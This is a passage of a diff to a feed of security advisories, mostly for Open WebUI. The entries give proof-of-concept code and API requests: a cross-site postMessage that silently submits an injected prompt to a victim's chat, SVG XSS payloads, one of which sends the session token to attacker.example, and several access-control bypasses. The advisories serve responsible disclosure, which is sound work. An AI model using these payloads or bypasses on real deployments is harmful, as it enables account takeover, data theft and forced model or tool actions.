-Normally, via the `input:prompt:submit` postMessage type, this results in a "Confirm Prompt from Embed" confirmation dialog:&#13;
-&#13;
-https://github.com/open-webui/open-webui/blob/9bd84258d09eefe7bf975878fb0e31a5dadfe0f8/src/lib/components/chat/Chat.svelte#L604-L622&#13;
-&#13;
-However, combining the two other types, it is possible to achieve the same effect without this confirmation:&#13;
-&#13;
-https://github.com/open-webui/open-webui/blob/9bd84258d09eefe7bf975878fb0e31a5dadfe0f8/src/lib/components/chat/Chat.svelte#L584-L602&#13;
-&#13;
-### PoC&#13;
-&#13;
-1. Set up a local Open WebUI instance and log in to it, making sure a model is configured&#13;
-2. Host the following HTML anywhere and visit it (optionally change http://127.0.0.1:14000 to your instance Base URL):&#13;
-&#13;
-```html&#13;
-&lt;h1&gt;Click anywhere&lt;/h1&gt;&#13;
-&lt;script&gt;&#13;
-  function sleep(ms) {&#13;
-    return new Promise(r =&gt; setTimeout(r, ms));&#13;
-  }&#13;
-  &#13;
-  onclick = async () =&gt; {&#13;
-    w = window.open('http://127.0.0.1:14000');&#13;
-    await sleep(2000);&#13;
-    w.postMessage({ type: 'input:prompt', text: "INJECTED PROMPT" }, '*');&#13;
-    await sleep(500);&#13;
-    w.postMessage({ type: 'action:submit' }, '*');&#13;
-  }&#13;
-&lt;/script&gt;&#13;
-```&#13;
-&#13;
-3. Click anywhere on the page, then notice without further interaction the "INJECTED PROMPT" is executed on the Open WebUI instance&#13;
-&#13;
-&lt;img width="874" height="264" alt="image" src="https://github.com/user-attachments/assets/244d9015-0dbf-47e0-a30e-1c2fbbde5e58" /&gt;&#13;
-&#13;
-### Impact&#13;
-&#13;
-Conditions required: The victim must be authenticated to Open WebUI in the browser (token cookie present).&#13;
-&#13;
-This issue enables cross-site forced actions under the victim's identity. An attacker can silently inject prompts and trigger model/tool execution (e.g., code interpreter, web search, retrieval, terminal/tool servers) as the victim without confirmation.&#13;
-&#13;
-### Original Agent Report&#13;
-&#13;
-&lt;img width="400" alt="app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20439940 (4)" src="https://github.com/user-attachments/assets/7b6521ed-d08b-446d-a918-103523d08a1e" /&gt;&#13;
-</description>
-      <guid isPermaLink="false">GHSA-3vv5-8xxp-4f55</guid>
-      <pubDate>Thu, 11 Jun 2026 18:56:24 +0000</pubDate>
     </item>
     <item>
       <title>[MEDIUM] open-webui/open-webui – IDOR: Calendar event re-parenting allows writing events into another user's calendar</title>
@@ -4196,113 +4880,6 @@ Three issues combine to produce the leak:&#13;
       <pubDate>Wed, 13 May 2026 09:34:17 +0000</pubDate>
     </item>
     <item>
-      <title>[HIGH] open-webui/open-webui – Stored XSS via OAuth picture claim stored as SVG data URI in profile_image_url</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3wgj-c2hg-vm6q</link>
-      <description># Summary&#13;
-&#13;
-When a user signs in via OAuth, Open WebUI fetches the `picture` claim URL, infers a MIME type from the URL extension via `mimetypes.guess_type`, and stores `data:&lt;mime&gt;;base64,...` as the user's profile image. The OAuth code path does not go through the `validate_profile_image_url` Pydantic validator that normally restricts profile images to PNG/JPEG/GIF/WebP. A `.svg` URL in the `picture` claim lands in the database as `data:image/svg+xml;base64,...`.&#13;
-&#13;
-The profile image endpoint `GET /api/v1/users/{id}/profile/image` returns the stored data URI with the attacker-controlled MIME type as `Content-Type` and `Content-Disposition: inline`. Security headers (CSP, `X-Content-Type-Options`) are env-gated and not set by default. An authenticated user navigating directly to that URL gets the SVG as a top-level document, executing `&lt;script&gt;`/`onload` in the same origin and able to read `localStorage.token` → account takeover.&#13;
-&#13;
-Same class of trust-boundary error as CVE-2025-64496 (trust of untrusted model servers) and CVE-2025-64495 (rich-text XSS). Different sink, different code path.&#13;
-&#13;
-# Details&#13;
-&#13;
-## 1. MIME inferred from URL extension, not Content-Type&#13;
-&#13;
-`backend/open_webui/utils/oauth.py:1336-1345` — `_process_picture_url`:&#13;
-&#13;
-```python&#13;
-response = await client.get(picture_url, ...)&#13;
-if response.status_code == 200:&#13;
-    picture = response.content&#13;
-    base64_encoded_picture = base64.b64encode(picture).decode("utf-8")&#13;
-    guessed_mime_type = mimetypes.guess_type(picture_url)[0]&#13;
-    if guessed_mime_type is None:&#13;
-        guessed_mime_type = "image/jpeg"&#13;
-    return f"data:{guessed_mime_type};base64,{base64_encoded_picture}"&#13;
-```&#13;
-&#13;
-No MIME allowlist. The upstream `Content-Type` is ignored. For a URL ending in `.svg`, `mimetypes.guess_type` returns `image/svg+xml`.&#13;
-&#13;
-## 2. OAuth path bypasses the profile-image validator&#13;
-&#13;
-`backend/open_webui/utils/validate.py:10-36` defines `validate_profile_image_url`, which only accepts `/user.png`, `/user-mono.png`, and `data:image/{png,jpeg,gif,webp};base64,...`.&#13;
-&#13;
-This validator is wired into Pydantic form models (`SignupForm`, `UpdateProfileForm`, `UserUpdateForm`), but the OAuth flow at `oauth.py:1536-1540` (existing-user login) and `oauth.py:1556-1574` (new-user signup) writes via `Users.update_user_profile_image_url_by_id` and `Auths.insert_new_auth`, both of which call SQLAlchemy directly (`models/users.py:575-588`) without going through any Pydantic model. The SVG data URI lands in the DB unchallenged.&#13;
-&#13;
-## 3. Endpoint serves attacker-controlled MIME with `inline` disposition&#13;
-&#13;
-`backend/open_webui/routers/users.py:504-528` — `get_user_profile_image_by_id`:&#13;
-&#13;
-```python&#13;
-header, encoded = image.split(",", 1)&#13;
-media_type = header.split(";")[0].lstrip("data:")  # "image/svg+xml"&#13;
-data = base64.b64decode(encoded)&#13;
-return StreamingResponse(&#13;
-    iter([data]),&#13;
-    media_type=media_type,&#13;
-    headers={"Content-Disposition": "inline"},&#13;
-)&#13;
-```&#13;
-&#13;
-No MIME whitelist. The route requires `get_verified_user` — any authenticated user reaches it.&#13;
-&#13;
-## 4. No default CSP / nosniff&#13;
-&#13;
-`backend/open_webui/utils/security_headers.py:16-61` populates headers only when the operator sets the corresponding env var. The default deployment returns none of these. Browsers render a top-level `image/svg+xml` response as an XML document and execute embedded script.&#13;
-&#13;
-# PoC&#13;
-&#13;
-**Prerequisites**: operator has OAuth signup enabled (`ENABLE_OAUTH_SIGNUP=true`) or OAuth login with picture sync (`OAUTH_UPDATE_PICTURE_ON_LOGIN=true`). The attacker has a valid identity on the configured IdP and can set their profile picture URL.&#13;
-&#13;
-1. Attacker hosts a malicious SVG at `https://attacker.example/p.svg`:&#13;
-&#13;
-```xml&#13;
-&lt;svg xmlns="http://www.w3.org/2000/svg"&#13;
-     onload="fetch('https://attacker.example/x?c='+encodeURIComponent(localStorage.getItem('token')))" /&gt;&#13;
-```&#13;
-&#13;
-2. Attacker sets their IdP profile picture to that URL and signs in to Open WebUI via OAuth. Signup (or login with picture sync) stores `data:image/svg+xml;base64,...` in the attacker's `profile_image_url`.&#13;
-&#13;
-3. Attacker shares a link to their own profile image with a victim in a chat DM or channel:&#13;
-&#13;
-```&#13;
-https://target.example/api/v1/users/&lt;attacker-user-id&gt;/profile/image&#13;
-```&#13;
-&#13;
-4. The authenticated victim clicks the link. The browser receives `Content-Type: image/svg+xml` with `Content-Disposition: inline`, renders the SVG as a top-level document, fires `onload`, and exfiltrates the victim's JWT. Attacker uses the JWT to take over the victim's account.&#13;
-&#13;
-# Impact&#13;
-&#13;
-- Account takeover of any authenticated user who opens the crafted URL.&#13;
-- Post-takeover: access to the victim's chats, API keys stored in their settings, and — if the victim has `workspace.tools` permission — RCE via installed tools (per CVE-2025-64496 analysis).&#13;
-- The same `_process_picture_url` function has no SSRF allowlist; a secondary primitive is to point the `picture` claim at an internal URL (metadata service, internal admin panel) and read the response bytes via the profile image endpoint.&#13;
-&#13;
-# Suggested fix&#13;
-&#13;
-1. In `_process_picture_url` (`utils/oauth.py:1336-1345`): reject any MIME outside `{image/png, image/jpeg, image/gif, image/webp}`. Use the upstream `Content-Type` response header, not the URL extension. Also add an SSRF allowlist or at minimum block RFC1918 / link-local / loopback targets.&#13;
-&#13;
-2. In `get_user_profile_image_by_id` (`routers/users.py:504-528`): enforce a MIME whitelist before building `StreamingResponse`. This is the defense-in-depth layer that should have caught the bypass.&#13;
-&#13;
-3. Apply `validate_profile_image_url` at the model/storage layer (`Users.update_user_profile_image_url_by_id`), not only at the Pydantic form layer. All write paths to the profile image column should go through the same validator.&#13;
-&#13;
-4. Set `X-Content-Type-Options: nosniff` and a default CSP unless the operator explicitly disables them.&#13;
-&#13;
-# References&#13;
-&#13;
-- `backend/open_webui/utils/oauth.py:1318-1351` — MIME guess + fetch&#13;
-- `backend/open_webui/utils/oauth.py:1536-1574` — OAuth write path&#13;
-- `backend/open_webui/utils/validate.py:10-36` — validator (bypassed)&#13;
-- `backend/open_webui/models/users.py:575-588` — DB write&#13;
-- `backend/open_webui/routers/users.py:504-528` — serving endpoint&#13;
-- `backend/open_webui/utils/security_headers.py:16-61` — env-gated headers&#13;
-- CVE-2025-64496 — precedent: trust boundary error (same class)&#13;
-- CVE-2025-64495 — precedent: rich-text XSS (same class)</description>
-      <guid isPermaLink="false">GHSA-3wgj-c2hg-vm6q</guid>
-      <pubDate>Sun, 10 May 2026 19:49:20 +0000</pubDate>
-    </item>
-    <item>
       <title>[MEDIUM] open-webui/open-webui – Unauthenticated RAG Configuration Disclosure</title>
       <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-65pg-qhhw-mxwg</link>
       <description>**Vulnerability Type:** Information Disclosure / Missing Authentication  &#13;
@@ -5290,96 +5867,6 @@ https://github.com/user-attachments/assets/c263bfcd-b923-4891-9c2f-a01c1faa6408&
       <pubDate>Sat, 09 May 2026 08:02:50 +0000</pubDate>
     </item>
     <item>
-      <title>[HIGH] open-webui/open-webui – XSS via SVG in /api/v1/channels/webhooks/{webhook_id}/profile/image</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3856-3vxq-m6fc</link>
-      <description>As part of our research on improving our [AI pentest](https://www.aikido.dev/attack/aipentest), we have uncovered the following issue in Open WebUI. We've manually verified and tided up the report, but you can also find the original agent finding at the bottom of this report.&#13;
-&#13;
-### Summary&#13;
-&#13;
-The channel webhook create/update flow accepts arbitrary `profile_image_url` values, including `data:image/svg+xml;base64,...` payloads. The profile image endpoint then decodes and serves this SVG as `image/svg+xml` without sanitization, allowing attacker-controlled script handlers (for example onload) to execute when the profile-image URL is opened in the browser.&#13;
-&#13;
-### Details&#13;
-&#13;
-The server accepts `data:image/svg+xml;base64,...` values for `profile_image_url` when creating or updating a webhook. Later, `GET /api/v1/channels/webhooks/{webhook_id}/profile/image` detects `data:image`, base64-decodes it, derives the media type from the header (e.g., `image/svg+xml`), and returns a `StreamingResponse` with `Content-Disposition: inline` and `media_type` set to `image/svg+xml`. There is no sanitization or transformation. When this URL is opened in a browser, SVG event handlers such as onload execute in the application origin, resulting in stored XSS.&#13;
-&#13;
-### PoC&#13;
-&#13;
-1. Set up a new instance of Open WebUI and log in as admin&#13;
-2. In the Admin Panel, enable *Channels (Beta)* and click Save&#13;
-3. Create a low-privilege user in the Users tab&#13;
-4. As the attacker, use the low-privilege user to run the following script:&#13;
-&#13;
-```py&#13;
-import base64&#13;
-import secrets&#13;
-&#13;
-import requests&#13;
-&#13;
-BASE_URL = "http://127.0.0.1:14000"&#13;
-EMAIL = "low@local.test"&#13;
-PASSWORD = "low"&#13;
-&#13;
-CHANNEL_NAME_PREFIX = "xsswh-poc"&#13;
-WEBHOOK_NAME = "xss-webhook-poc"&#13;
-SVG_CANARY = '&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(origin)"&gt;&lt;/svg&gt;'&#13;
-&#13;
-if __name__ == "__main__":&#13;
-    s = requests.Session()&#13;
-    s.headers.update({"Content-Type": "application/json"})&#13;
-&#13;
-    r = s.post(&#13;
-        f"{BASE_URL}/api/v1/auths/signin",&#13;
-        json={"email": EMAIL, "password": PASSWORD},&#13;
-        timeout=30,&#13;
-    )&#13;
-    r.raise_for_status()&#13;
-    s.headers["Authorization"] = f"Bearer {r.json()['token']}"&#13;
-&#13;
-    r = s.post(&#13;
-        f"{BASE_URL}/api/v1/channels/create",&#13;
-        json={&#13;
-            "name": f"{CHANNEL_NAME_PREFIX}-{secrets.token_hex(4)}",&#13;
-            "type": "group",&#13;
-            "user_ids": [],&#13;
-            "group_ids": [],&#13;
-        },&#13;
-        timeout=30,&#13;
-    )&#13;
-    r.raise_for_status()&#13;
-    channel_id = r.json()["id"]&#13;
-&#13;
-    payload = "data:image/svg+xml;base64," + base64.b64encode(SVG_CANARY.encode()).decode()&#13;
-    r = s.post(&#13;
-        f"{BASE_URL}/api/v1/channels/{channel_id}/webhooks/create",&#13;
-        json={"name": WEBHOOK_NAME, "profile_image_url": payload},&#13;
-        timeout=30,&#13;
-    )&#13;
-    r.raise_for_status()&#13;
-    webhook_id = r.json()["id"]&#13;
-&#13;
-    print(f"{BASE_URL}/api/v1/channels/webhooks/{webhook_id}/profile/image")&#13;
-```&#13;
-&#13;
-This should print a URL like the following, which when visited (by any user), triggers a JavaScript popup proving XSS:&#13;
-&#13;
-http://127.0.0.1:14000/api/v1/channels/webhooks/aa7c925f-4584-4274-82bf-33a7e98a3365/profile/image&#13;
-&#13;
-&lt;img width="1079" height="222" alt="image" src="https://github.com/user-attachments/assets/ce158ace-d14f-4a73-aeb0-e828aff005df" /&gt;&#13;
-&#13;
-### Impact&#13;
-&#13;
-Conditions required: The victim must be an authenticated, verified user. Channel feature must be enabled.&#13;
-&#13;
-Stored XSS enables arbitrary JavaScript execution in the context of the application's origin for any viewer who loads the malicious profile image URL. An attacker can exfiltrate session tokens (localstorage) or API keys stored in the page context, perform unauthorized actions on behalf of the victim via same-origin APIs, alter settings, or pivot to broader account compromise. Because this vector is persisted in the database as part of a webhook's profile image, it remains active until removed.&#13;
-&#13;
-### Original Agent Report&#13;
-&#13;
-&lt;img width="400" alt="app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20439766 (5)" src="https://github.com/user-attachments/assets/0bfb2c7c-f7c4-49cd-a262-5ed9e1bb10df" /&gt;&#13;
-</description>
-      <guid isPermaLink="false">GHSA-3856-3vxq-m6fc</guid>
-      <pubDate>Sat, 09 May 2026 08:02:43 +0000</pubDate>
-    </item>
-    <item>
       <title>[MEDIUM] espocrm/espocrm – IDOR in EmailTemplate Prepare Endpoint Leaks Entity Data via Email Address Lookup</title>
       <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-vvmh-mf4h-96hw</link>
       <description>### Summary&#13;
@@ -5616,446 +6103,6 @@ Recommended fixes:&#13;
 ---</description>
       <guid isPermaLink="false">GHSA-5wh5-ccv2-m3pv</guid>
       <pubDate>Fri, 08 May 2026 15:33:41 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui – Channel Access Grants Bypass filter_allowed_access_grants</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-7rjh-px4v-5w55</link>
-      <description># Channel Access Grants Bypass filter_allowed_access_grants&#13;
-&#13;
-## Affected Component&#13;
-&#13;
-Channel creation and update endpoints:&#13;
-- `backend/open_webui/routers/channels.py` (lines 291-340, `create_new_channel`)&#13;
-- `backend/open_webui/routers/channels.py` (lines 617-638, `update_channel_by_id`)&#13;
-- `backend/open_webui/models/channels.py` (lines 825-826, `set_access_grants` call without filtering)&#13;
-&#13;
-## Affected Versions&#13;
-&#13;
-Current main branch (commit `6fdd19bf1`) and likely all versions supporting user-created group channels with access grants.&#13;
-&#13;
-## Description&#13;
-&#13;
-All resource routers in Open WebUI (knowledge, models, notes, prompts, tools, skills) call `filter_allowed_access_grants()` before persisting access grants. This function strips `principal_id: "*"` wildcard grants from users who lack the relevant `sharing.public_*` permission, and strips individual user grants from users who lack `access_grants.allow_users` permission.&#13;
-&#13;
-The channel router does not call `filter_allowed_access_grants` on either create or update paths. A non-admin user who can create group channels (or who owns a channel) can submit arbitrary access grants — including public wildcard grants — and those grants are stored verbatim, bypassing the admin's permission framework.&#13;
-&#13;
-```python&#13;
-# channels.py — access_grants from form data flow directly into persistence&#13;
-# No call to filter_allowed_access_grants() anywhere in these paths.&#13;
-&#13;
-# Compare with knowledge.py / models.py / notes.py / prompts.py / tools.py / skills.py,&#13;
-# all of which do:&#13;
-#     form_data.access_grants = filter_allowed_access_grants(user, form_data.access_grants)&#13;
-# before creating or updating.&#13;
-```&#13;
-&#13;
-## Attack Scenario&#13;
-&#13;
-1. Admin configures permissions so that regular users do NOT have `sharing.public_channels` — public sharing of channels is intended to be admin-only.&#13;
-2. Attacker (a regular user) creates or owns a group channel.&#13;
-3. Attacker sends:&#13;
-   ```&#13;
-   POST /api/v1/channels/&#13;
-   {&#13;
-     "name": "public-channel",&#13;
-     "type": "group",&#13;
-     "access_control": {&#13;
-       "access_grants": [&#13;
-         {"principal_type": "user", "principal_id": "*", "permission": "read"}&#13;
-       ]&#13;
-     }&#13;
-   }&#13;
-   ```&#13;
-4. `set_access_grants` is called directly without `filter_allowed_access_grants` — the wildcard grant is persisted.&#13;
-5. The channel becomes publicly readable to every user on the instance, despite the admin's policy prohibiting public channels for regular users.&#13;
-&#13;
-The same attack works via `POST /api/v1/channels/{id}/update` for any channel the attacker owns.&#13;
-&#13;
-## Impact&#13;
-&#13;
-- Regular users can bypass the `sharing.public_channels` permission and make channels publicly accessible&#13;
-- Regular users can bypass `access_grants.allow_users` to grant individual-user access in environments where only group-based sharing is intended&#13;
-- Admin's permission framework for channels is silently ineffective&#13;
-- Creates an inconsistency with every other resource type in the codebase, making the security posture harder to reason about&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- Attacker must have an account with the ability to create group channels (default user capability), or ownership of an existing channel&#13;
-- Admin must have configured restrictive sharing permissions for regular users (otherwise there's no policy to bypass)</description>
-      <guid isPermaLink="false">GHSA-7rjh-px4v-5w55</guid>
-      <pubDate>Tue, 05 May 2026 11:19:02 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui – Global Knowledge Base Enumeration via knowledge-bases Meta-Collection</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-6c2x-gcp3-gp73</link>
-      <description># Global Knowledge Base Enumeration via knowledge-bases Meta-Collection&#13;
-&#13;
-## Affected Component&#13;
-&#13;
-Retrieval collection access validation:&#13;
-- `backend/open_webui/routers/retrieval.py` (lines 2330-2355, `_validate_collection_access`)&#13;
-- `backend/open_webui/routers/retrieval.py` (query endpoints, e.g. `POST /query/doc`)&#13;
-&#13;
-## Affected Versions&#13;
-&#13;
-Current main branch (commit `6fdd19bf1`) and likely all versions with the knowledge base subsystem.&#13;
-&#13;
-## Description&#13;
-&#13;
-The `_validate_collection_access` function uses an incomplete allowlist that only enforces ownership checks for collections matching `user-memory-*` and `file-*` patterns. All other collection names pass through unchecked — including the system-level `knowledge-bases` meta-collection, which stores the IDs, names, and descriptions of every knowledge base on the instance.&#13;
-&#13;
-Any authenticated user can query this meta-collection directly via the retrieval query endpoints to obtain a global index of all knowledge bases across all users.&#13;
-&#13;
-```python&#13;
-# retrieval.py:2330-2355 — incomplete collection allowlist&#13;
-def _validate_collection_access(user, collection_name, ...):&#13;
-    if collection_name.startswith('user-memory-'):&#13;
-        # Check user-memory ownership&#13;
-        ...&#13;
-    elif collection_name.startswith('file-'):&#13;
-        # Check file access&#13;
-        ...&#13;
-    # Everything else (including "knowledge-bases") passes through unchecked&#13;
-```&#13;
-&#13;
-This finding is the enabler for the KB destruction (`process/web`), KB content injection (`process/file`), and RAG vector search access bypass findings — all of which require knowing a target KB's UUID. Without this enumeration, UUIDs are random and practically unguessable; with it, UUIDs across the entire instance are trivially obtained.&#13;
-&#13;
-## CVSS 3.1 Breakdown&#13;
-&#13;
-| Metric | Value | Rationale |&#13;
-|--------|-------|-----------|&#13;
-| Attack Vector | Network (N) | Exploited remotely via API call |&#13;
-| Attack Complexity | Low (L) | Single API call |&#13;
-| Privileges Required | Low (L) | Requires any authenticated user account |&#13;
-| User Interaction | None (N) | No victim interaction required |&#13;
-| Scope | Unchanged (U) | Impact within the knowledge base boundary |&#13;
-| Confidentiality | Low (L) | Discloses KB metadata (IDs, names, descriptions) across all users |&#13;
-| Integrity | None (N) | No direct data modification |&#13;
-| Availability | None (N) | No denial of service |&#13;
-&#13;
-## Attack Scenario&#13;
-&#13;
-1. Attacker (any authenticated user) sends:&#13;
-   ```&#13;
-   POST /api/v1/retrieval/query/doc&#13;
-   {&#13;
-     "collection_name": "knowledge-bases",&#13;
-     "query": "confidential"&#13;
-   }&#13;
-   ```&#13;
-2. `_validate_collection_access` does not recognize the `knowledge-bases` prefix and lets the request pass.&#13;
-3. The vector search returns the most relevant documents from the meta-collection — knowledge base records including their UUIDs, names, and descriptions — across all users on the instance.&#13;
-4. Attacker varies the query to enumerate more KBs: `"project"`, `"internal"`, `"private"`, etc.&#13;
-5. Attacker now has a full target list for subsequent attacks (destruction, poisoning, content extraction).&#13;
-&#13;
-## Impact&#13;
-&#13;
-- **Information disclosure:** KB names and descriptions may reveal sensitive project names, internal initiatives, or user activities&#13;
-- **Enabler for other attacks:** Unlocks the following findings by supplying the required target UUIDs:&#13;
-  - KB destruction/poisoning via `process/web`&#13;
-  - Cross-user content injection via `process/file`&#13;
-  - RAG vector search access bypass in `retrieval/utils.py`&#13;
-- Transforms these from theoretical (requires UUID guessing) to trivially exploitable (UUIDs enumerable)&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- Attacker must have a valid user account</description>
-      <guid isPermaLink="false">GHSA-6c2x-gcp3-gp73</guid>
-      <pubDate>Tue, 05 May 2026 11:18:53 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui – Base Model Routing Bypasses Access Control via Model Chaining</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-9vvh-qmjx-p4q8</link>
-      <description># Base Model Routing Bypasses Access Control via Model Chaining&#13;
-&#13;
-## Affected Component&#13;
-&#13;
-Model chaining via `base_model_id`:&#13;
-- `backend/open_webui/routers/models.py` (lines 170-214, `create_new_model`)&#13;
-- `backend/open_webui/routers/models.py` (lines 254-308, `import_models`)&#13;
-- `backend/open_webui/main.py` (lines 1696-1711, base model resolution in chat completion)&#13;
-- `backend/open_webui/routers/openai.py` (lines 1032-1037, base model payload rewrite)&#13;
-- `backend/open_webui/routers/ollama.py` (lines 1086-1090, base model payload rewrite)&#13;
-- `backend/open_webui/utils/models.py` (line 380, `check_model_access` — checks user-facing model only)&#13;
-&#13;
-## Affected Versions&#13;
-&#13;
-Current main branch (commit `6fdd19bf1`) and likely all versions with the model chaining (`base_model_id`) feature.&#13;
-&#13;
-## Description&#13;
-&#13;
-Open WebUI supports model composition via `base_model_id`: a user-defined model (e.g., "Cheap Assistant") can reference an existing base model (e.g., "gpt-4-turbo-restricted") that provides the actual inference capability. When a user queries the composed model, the access control pipeline verifies the user has access to the composed model but never re-verifies access to the chained base model.&#13;
-&#13;
-Additionally, the model creation and import endpoints accept arbitrary `base_model_id` values without checking that the caller has access to that base model. Combined, this allows any user with the default model creation permission to create a model that chains to a restricted base model — and then invoke it, causing the server to dispatch the request to the restricted base model using the admin-configured API key.&#13;
-&#13;
-```python&#13;
-# utils/models.py:380 — access check runs against the user-facing model only&#13;
-def check_model_access(user, model):&#13;
-    if user.role == 'user':&#13;
-        ...check access grants on `model`...&#13;
-&#13;
-# main.py:1696-1711 — base model resolved without access check&#13;
-base_model = request.app.state.MODELS.get(model.info.base_model_id)&#13;
-if base_model:&#13;
-    # payload["model"] is rewritten to base_model.id&#13;
-    # but no check_model_access(user, base_model) is performed&#13;
-&#13;
-# openai.py:1032-1037 / ollama.py:1086-1090 — the rewritten payload is dispatched&#13;
-payload['model'] = base_model_id&#13;
-```&#13;
-&#13;
-## Attack Scenario&#13;
-&#13;
-1. Admin provisions a premium/restricted model `gpt-4-turbo-restricted` and configures access grants so only the "ML Engineers" group can use it.&#13;
-2. Attacker (a regular user not in that group) calls:&#13;
-   ```&#13;
-   POST /api/v1/models/create&#13;
-   {&#13;
-     "id": "cheap-assistant",&#13;
-     "name": "Cheap Assistant",&#13;
-     "base_model_id": "gpt-4-turbo-restricted",&#13;
-     "params": {},&#13;
-     "meta": {}&#13;
-   }&#13;
-   ```&#13;
-   The creation endpoint does not validate the attacker's access to `gpt-4-turbo-restricted`.&#13;
-3. Attacker now owns `cheap-assistant`. `check_model_access(attacker, cheap-assistant)` passes trivially because they are the owner.&#13;
-4. Attacker sends:&#13;
-   ```&#13;
-   POST /api/chat/completions&#13;
-   {"model": "cheap-assistant", "messages": [...]}&#13;
-   ```&#13;
-5. At `main.py:1696`, the pipeline resolves `cheap-assistant.base_model_id` to `gpt-4-turbo-restricted`, rewrites `payload["model"]` to the base model ID, and dispatches the upstream request with the admin-configured API key for the backend.&#13;
-6. The attacker receives responses from the restricted model, bypassing the access grant policy.&#13;
-&#13;
-The same bypass is available via the import endpoint, which additionally allows overwriting existing models (see related finding on model import ownership).&#13;
-&#13;
-## Impact&#13;
-&#13;
-- Regular users can query restricted models by chaining through a self-owned wrapper model&#13;
-- Access control on `gpt-4-turbo-restricted` (or equivalent paid/tiered/internal models) becomes silently ineffective&#13;
-- Direct cost impact on pay-per-token backends (OpenAI, Anthropic, Azure) — the admin's API key is used for requests the admin intended to forbid&#13;
-- Creates a false sense of security — the admin sees access restrictions work through the standard model selector but not through user-created chains&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- Attacker must have model creation permission (default `workspace.models` permission, granted to all users by default)&#13;
-- A restricted base model must exist on the instance (the target of the chain)</description>
-      <guid isPermaLink="false">GHSA-9vvh-qmjx-p4q8</guid>
-      <pubDate>Tue, 05 May 2026 11:18:42 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui – Stale Admin Role in Socket.IO Session Pool Enables Post-Demotion Cross-User Note Access</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-45m8-cpm2-3v65</link>
-      <description># Stale Admin Role in Socket.IO Session Pool Enables Post-Demotion Cross-User Note Access&#13;
-&#13;
-## Affected Component&#13;
-&#13;
-Socket.IO session state and role-check callsites:&#13;
-- `backend/open_webui/socket/main.py` (lines 330-351, `connect` handler — role snapshotted into SESSION_POOL)&#13;
-- `backend/open_webui/socket/main.py` (lines 393-398, `heartbeat` handler — does not refresh role)&#13;
-- `backend/open_webui/socket/main.py` (line 538, `ydoc:document:join` — uses cached role for admin check)&#13;
-- `backend/open_webui/socket/main.py` (line 611, `document_save_handler` — uses cached role for admin check)&#13;
-- `backend/open_webui/routers/users.py` (lines 557-633, role update — does not invalidate SESSION_POOL)&#13;
-- `backend/open_webui/routers/users.py` (line 641, user delete — does not invalidate SESSION_POOL)&#13;
-&#13;
-## Affected Versions&#13;
-&#13;
-Current main branch (commit `6fdd19bf1`) and likely all versions with the collaborative document (Yjs) Socket.IO handlers.&#13;
-&#13;
-## Description&#13;
-&#13;
-When a user connects via Socket.IO, the `connect` handler authenticates them via JWT and stores their user record (including `role`) in the in-memory `SESSION_POOL` dictionary keyed by session ID. The `heartbeat` handler keeps the session alive indefinitely but only refreshes the `last_seen_at` timestamp — never the role.&#13;
-&#13;
-Role checks in the Yjs collaborative document handlers (`ydoc:document:join`, `document_save_handler`) consult the cached `SESSION_POOL` role rather than the database. Meanwhile, administrative role changes and user deletions do not iterate `SESSION_POOL` to disconnect affected sessions. As a result, a user whose admin role has been revoked retains admin privileges within their existing Socket.IO session for as long as they keep the connection alive (via automatic heartbeats).&#13;
-&#13;
-HTTP endpoints are not affected — `get_current_user` at [utils/auth.py](backend/open_webui/utils/auth.py) refetches the user record from the database on every request. The gap is exclusive to the Socket.IO session cache.&#13;
-&#13;
-```python&#13;
-# socket/main.py:330-351 — role snapshotted at connect time&#13;
-async def connect(sid, environ, auth):&#13;
-    user = None&#13;
-    if auth and 'token' in auth:&#13;
-        data = decode_token(auth['token'])&#13;
-        if data is not None and 'id' in data:&#13;
-            user = Users.get_user_by_id(data['id'])&#13;
-        if user:&#13;
-            SESSION_POOL[sid] = {&#13;
-                'id': user.id,&#13;
-                'role': user.role,   # ← snapshotted, never refreshed&#13;
-                ...&#13;
-            }&#13;
-&#13;
-# socket/main.py:393-398 — heartbeat refreshes last_seen_at only&#13;
-async def heartbeat(sid, data):&#13;
-    user = SESSION_POOL.get(sid)&#13;
-    if user:&#13;
-        SESSION_POOL[sid] = {**user, 'last_seen_at': int(time.time())}&#13;
-        # role is carried forward unchanged&#13;
-&#13;
-# socket/main.py:538 — admin check against cached role&#13;
-if user.get('role') != 'admin' and not has_access(user_id, 'note', note_id, 'read', db=db):&#13;
-    return&#13;
-```&#13;
-&#13;
-## Attack Scenario&#13;
-&#13;
-1. User B is an admin and has an active browser session with a live Socket.IO connection. `SESSION_POOL[sid]` records `role='admin'`.&#13;
-2. Admin A demotes User B to a regular user via `POST /api/v1/users/{B_id}/update`. The DB `user.role` becomes `'user'`.&#13;
-3. No Socket.IO disconnect, no SESSION_POOL update, no token revocation event is triggered by the role change.&#13;
-4. User B's client continues sending `heartbeat` events every few seconds; these are accepted and only refresh `last_seen_at`.&#13;
-5. User B emits `ydoc:document:join` with `document_id = 'note:&lt;victim_note_id&gt;'` for any note they do not own.&#13;
-6. The handler at line 538 evaluates `user.get('role') != 'admin'` — returns `False` because `SESSION_POOL` still holds the stale `admin` role. Access check is bypassed, User B joins the document room, receives full document state and live updates.&#13;
-7. User B emits `ydoc:document:update` for the same note. The handler at line 611 performs the same cached-admin check, bypasses authorization, and persists attacker-controlled content to the victim's note via `Notes.update_note_by_id`.&#13;
-&#13;
